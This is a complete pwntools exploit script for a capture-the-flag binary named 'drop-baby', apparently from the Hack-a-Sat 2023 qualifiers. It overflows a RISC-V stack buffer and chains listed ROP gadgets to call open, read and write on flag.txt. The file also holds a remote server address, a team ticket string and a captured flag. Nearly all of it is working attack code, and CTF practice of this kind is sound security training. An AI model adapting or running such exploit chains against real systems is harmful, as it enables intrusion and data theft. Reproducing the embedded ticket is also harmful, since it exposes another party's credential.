
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *
import sys
import os

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./drop-baby')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# ret at buffer overflow
hbreak *do_b2+0x56
command
    tbreak open
    tbreak read
    tbreak write
end
'''.format(**locals())
if args.GDB:
    log.info('Using gdb script:\n'+gdbscript)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
if args['REMOTE']:
    remote_server = 'drop.quals2023-kah5Aiv9.satellitesabove.me'
    remote_port = 5300
else:
    arguments = []
    os.environ['FLAG'] = 'hackasat{dummy-flag}'
    os.environ['TIMEOUT'] = '3600'

def bruteForceIni(): # result is input length to print the ini
    mydata = b''
    while True:
        mydata += b'A'
        print(f"Attempting data len: {len(mydata)}")

        if args['REMOTE']:
            io = remote(remote_server, remote_port)
            io.recvline() # Ticket please:
            io.send(b'ticket{alpha542765whiskey4:GLnT34rPAupXSBMNiLWcgk0dLhUeF5gSSzxqnownNALObAoYzg8MHH0jle5Ttq7FXw}\n')
        else:
            io = start(arguments)
        io.recvline_endswith(b'Exploit me!')
        io.send(b'\xde\xad\xbe\xef') # sync prefix
        io.send(b'\xb1') # read_message
        io.send(mydata + p32(crc.crc_32(mydata)))
        printed_data = io.recvall(timeout=2)
        if len(printed_data) > 0:
            print(printed_data.decode('ascii'))
            sys.exit(0)
        io.close()
# bruteForceIni()

def sendCmd(cmd: int, data: bytes): # read_message() in target binary
    io.send(bytes([cmd]))
    if cmd == 0xa1:
        data_len = 36
    elif cmd == 0xa2:
        data_len = 6
    elif cmd == 0xb1:
        data_len = 16
    elif cmd == 0xb2:
        data_len = 296
    assert(len(data) <= data_len)
    if len(data) < data_len:
        data = data + b'Z'*(data_len - len(data)) # pad
    io.send(data + p32(crc.crc_32(data)))

if args['REMOTE']:
    io = remote(remote_server, remote_port)
    io.recvline() # Ticket please:
    io.send(b'ticket{alpha542765whiskey4:GLnT34rPAupXSBMNiLWcgk0dLhUeF5gSSzxqnownNALObAoYzg8MHH0jle5Ttq7FXw}\n')
else:
    io = start(arguments)

io.recvline_endswith(b'Exploit me!')
io.send(b'\xde\xad\xbe\xef') # sync prefix: deadbeef


# For the buffer overflow:
# g = cyclic_gen()
# sendCmd(0xb2, g.get(296))
# g.find(b'eaab') # (116, 0, 116)

flag_txt__addr = 0x4c03c # "flag.txt"
open__addr     = 0x2178c
read__addr     = 0x2184e
write__addr    = 0x218da
read_message__addr = 0x10cec
flag_buffer__addr  = 0x6e6b0
# guess the fd from open("flag.txt")
# Alternatively, we could have stored it somewhere.
if args.GDB:
    guessed_fd     = 5
else:
    guessed_fd     = 3


########## ROP chain idea:
# fd = open("flag.txt", 0, 0)
# read(fd, buf, 0x100)
# write(1, buf, 0x100)
#
# To invoke a function call and still retain control, we need a gadget that loads ra to some value
# and then uses another register to jump to the target function with `jr/c.jr`. We do NOT want a `c.jalr` or `jalr ra`
########## stack related registers when the buffer overflow is triggered
# gef➤  info registers
# sp             0x407ffac0       0x407ffac0
# a1             0x407ffa48       0x407ffa48
# s3             0x407ffc34       0x407ffc34
# s4             0x407ffc3c       0x407ffc3c
# pc             0x10faa  0x10faa <do_b2+86>
# gef➤  p $sp
# $1 = (void *) 0x407ffac0
#
########## Useful gadgets
#
# 1. 0x0001a7e8 : c.lwsp ra, 0x2c(sp) ; c.lwsp s0, 0x28(sp) ; c.lwsp s1, 0x24(sp) ; c.lwsp s2, 0x20(sp) ; c.lwsp s3, 0x1c(sp) ; c.lwsp s5, 0x14(sp) ; c.lwsp s6, 0x10(sp) ; c.lwsp s7, 0xc(sp) ; c.lwsp s8, 8(sp) ; c.mv a0, s4 ; c.lwsp s4, 0x18(sp) ; c.addi16sp sp, 0x30 ; c.jr ra
#  sets s0, s1, s2, s3, s4, s5, s6, s7, s8, ra
#  jr ra
#
# 2. 0x00026900 : c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.mv a5, s8 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s6 ; c.jalr s0
#  set a0, a1, a2
#  a3=s6
#  a4=0
#  a5=s8
#  a6=0
#  jalr s0
#  WARNING: No `addi16sp` is present here
#
# 3. 0x0001a410 : c.lwsp ra, 0x1c(sp) ; c.addi16sp sp, 0x20 ; c.jr a5
#   set ra
#   jr a5
#
##########
# The gadgets 1,2,3 can be combined to make arbitrary function calls with up to 3 attacker-controlled arguments
# and still retain the control flow under attacker control after the function call has finished
# 
########### Other useful gadgets
# 
# 0x00027d94 : c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s0 ; c.jalr s11
#  set a0, a1, a2
#  a3=s0
#  a4=0
#  a6=0
#  jalr s11
#
# 0x0002a042 : c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.lwsp t1, 0(sp) ; c.mv a5, s9 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s0 ; c.jalr t1
#  set a0, a1, a2, t1
#  a3=s0
#  a4=0
#  a5=s9
#  a6=0
#  jalr t1
#
# 0x00025e2e : c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.mv a5, s5 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s7 ; c.jalr s6
#  set a0, a1, a2
#  a3=s7
#  a4=0
#  a5=s5
#  a6=0
#  jalr s6
#
# 0x00027710 : c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.mv a5, s6 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s0 ; c.jalr s8
#  set a0, a1, a2
#  a3=s0
#  a4=0
#  a5=s6
#  a6=0
#  jalr s8
#
# 0x00041818 : c.lwsp ra, 0xc(sp) ; c.lwsp s0, 8(sp) ; c.addi sp, 0x10 ; c.jr ra ; 
#  set s0, ra
#  jr ra
# 0x000111b8 : c.lwsp ra, 0xc(sp) ; c.lwsp s0, 8(sp) ; c.lwsp s1, 4(sp) ; c.addi sp, 0x10 ; c.jr ra
#  set s0, s1, ra
#  jr ra
# 0x00030c12 : c.mv a1, s2 ; c.mv a0, s3 ; c.mv a2, s1 ; c.jalr s0
#  a0=s3
#  a1=s2
#  a2=s1
#  jalr s0
# 0x0006a156 : c.jr s0
# 0x000675ac : c.jr s2
# 0x00068eb8 : c.jr s4
# 0x000197f8 : c.jr a0
# 0x0003efcc : c.jr a2
# 0x00020a80 : c.jr a3
# 0x0001347c : c.jr a4
# 0x00015ce8 : c.jr a5
# 0x00068f04 : c.jr a6
#
########## Let's start the exploitation

# Initial buffer overflow
ropchain  = b'A'*112 # padding
ropchain += p32(0x41414141) # overwrite the s0/fp
ropchain += p32(0x0001a7e8) # overwrite the ra

# 0x0001a7e8 : c.lwsp ra, 0x2c(sp) ; c.lwsp s0, 0x28(sp) ; c.lwsp s1, 0x24(sp) ; c.lwsp s2, 0x20(sp) ; c.lwsp s3, 0x1c(sp) ; c.lwsp s5, 0x14(sp) ; c.lwsp s6, 0x10(sp) ; c.lwsp s7, 0xc(sp) ; c.lwsp s8, 8(sp) ; c.mv a0, s4 ; c.lwsp s4, 0x18(sp) ; c.addi16sp sp, 0x30 ; c.jr ra
ropchain += b'' 
ropchain += b'B'*8 # padding
ropchain += p32(open__addr) # s8
ropchain += b'C'*4 # s7
ropchain += b'D'*4 # s6
ropchain += b'E'*4 # s5
ropchain += b'F'*4 # s4
ropchain += b'G'*4 # s3
ropchain += b'H'*4 # s2
ropchain += b'I'*4 # s1
ropchain += p32(0x0001a410) # s0
ropchain += p32(0x00026900) # ra
  # jr ra

# 0x00026900 : c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.mv a5, s8 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s6 ; c.jalr s0
ropchain += b'J'*0x10
ropchain += p32(0x00000000)     # a2
ropchain += p32(flag_txt__addr) # a0
ropchain += p32(0x00000000)     # a1
  # a5=s8
  # a6=0
  # a4=0
  # a3=s6
  # jalr s0

# 0x0001a410 : c.lwsp ra, 0x1c(sp) ; c.addi16sp sp, 0x20 ; c.jr a5
ropchain += b''
ropchain += p32(read_message__addr) # ra - return address of open
  # jr a5

sendCmd(0xb2, ropchain) # trigger buffer overflow

################
# open now gets executed. It will return to the last value of ra (because we did not do a jalr, it will not return to ra+4)
################

# Initial buffer overflow
ropchain  = b'A'*112 # padding
ropchain += p32(0x41414141) # overwrite the s0/fp
ropchain += p32(0x0001a7e8) # overwrite the ra

# 0x0001a7e8 : c.lwsp ra, 0x2c(sp) ; c.lwsp s0, 0x28(sp) ; c.lwsp s1, 0x24(sp) ; c.lwsp s2, 0x20(sp) ; c.lwsp s3, 0x1c(sp) ; c.lwsp s5, 0x14(sp) ; c.lwsp s6, 0x10(sp) ; c.lwsp s7, 0xc(sp) ; c.lwsp s8, 8(sp) ; c.mv a0, s4 ; c.lwsp s4, 0x18(sp) ; c.addi16sp sp, 0x30 ; c.jr ra
ropchain += b'' 
ropchain += b'B'*8 # padding
ropchain += p32(read__addr) # s8
ropchain += b'C'*4 # s7
ropchain += b'D'*4 # s6
ropchain += b'E'*4 # s5
ropchain += b'F'*4 # s4
ropchain += b'G'*4 # s3
ropchain += b'H'*4 # s2
ropchain += b'I'*4 # s1
ropchain += p32(0x0001a410) # s0
ropchain += p32(0x00026900) # ra
  # jr ra

# 0x00026900 : c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.mv a5, s8 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s6 ; c.jalr s0
ropchain += b'J'*0x10
ropchain += p32(0x100)              # a2
ropchain += p32(guessed_fd)         # a0 - guess the opened fd
ropchain += p32(flag_buffer__addr)  # a1
  # a5=s8
  # a6=0
  # a4=0
  # a3=s6
  # jalr s0

# 0x0001a410 : c.lwsp ra, 0x1c(sp) ; c.addi16sp sp, 0x20 ; c.jr a5
ropchain += b''
ropchain += p32(read_message__addr) # ra - return address of read
  # jr a5

sendCmd(0xb2, ropchain) # trigger buffer overflow

################
# read now gets executed. It will return to the last value of ra (because we did not do a jalr, it will not return to ra+4)
################

# Initial buffer overflow
ropchain  = b'A'*112 # padding
ropchain += p32(0x41414141) # overwrite the s0/fp
ropchain += p32(0x0001a7e8) # overwrite the ra

# 0x0001a7e8 : c.lwsp ra, 0x2c(sp) ; c.lwsp s0, 0x28(sp) ; c.lwsp s1, 0x24(sp) ; c.lwsp s2, 0x20(sp) ; c.lwsp s3, 0x1c(sp) ; c.lwsp s5, 0x14(sp) ; c.lwsp s6, 0x10(sp) ; c.lwsp s7, 0xc(sp) ; c.lwsp s8, 8(sp) ; c.mv a0, s4 ; c.lwsp s4, 0x18(sp) ; c.addi16sp sp, 0x30 ; c.jr ra
ropchain += b'' 
ropchain += b'B'*8 # padding
ropchain += p32(write__addr) # s8
ropchain += b'C'*4 # s7
ropchain += b'D'*4 # s6
ropchain += b'E'*4 # s5
ropchain += b'F'*4 # s4
ropchain += b'G'*4 # s3
ropchain += b'H'*4 # s2
ropchain += b'I'*4 # s1
ropchain += p32(0x0001a410) # s0
ropchain += p32(0x00026900) # ra
  # jr ra

# 0x00026900 : c.lwsp a2, 0x10(sp) ; c.lwsp a1, 0x18(sp) ; c.lwsp a0, 0x14(sp) ; c.mv a5, s8 ; c.li a6, 0 ; c.li a4, 0 ; c.mv a3, s6 ; c.jalr s0
ropchain += b'J'*0x10
ropchain += p32(0x100)              # a2
ropchain += p32(1)                  # a0 - stdout fd
ropchain += p32(flag_buffer__addr)  # a1
  # a5=s8
  # a6=0
  # a4=0
  # a3=s6
  # jalr s0

# 0x0001a410 : c.lwsp ra, 0x1c(sp) ; c.addi16sp sp, 0x20 ; c.jr a5
ropchain += b''
ropchain += p32(0xdeadbeef) # ra - return address of write
  # jr a5

sendCmd(0xb2, ropchain) # trigger buffer overflow

################
# write now gets executed. It will return to the last value of ra (because we did not do a jalr, it will not return to ra+4)
################

print(io.recvall())
io.interactive()
io.close()

# flag{alpha542765whiskey4:GPqdDffrVbrK2ekLBBHPPxTAaVlGiyUaeB9ijBy4P9tHCyW_yprbd-CFQNnPe68Rl3Hp5rQCn2KErFL1AJY9CWk}
